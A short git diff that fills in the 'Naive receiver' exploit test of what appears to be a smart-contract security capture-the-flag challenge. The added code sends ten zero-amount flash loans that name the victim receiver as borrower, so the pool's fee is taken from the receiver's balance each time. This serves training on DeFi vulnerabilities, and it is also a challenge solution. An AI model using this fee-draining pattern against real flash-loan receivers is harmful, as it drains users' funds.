@@ -30,7 +30,15 @@ describe('[Challenge] Naive receiver', function () {
     });
 
     it('Exploit', async function () {
-        /** CODE YOUR EXPLOIT HERE */   
+        /**
+         * Send load tx with target receiver as borrower
+         * and 0 as borrow amount. So that every time an amount equal to `fee`
+         * of lender pool is repaid/deducted from receiver
+         */
+        await Promise.all(
+            Array.from({ length: 10 })
+            .map(() => this.pool.connect(attacker).flashLoan(this.receiver.address, 0))
+        );
     });
 
     after(async function () {
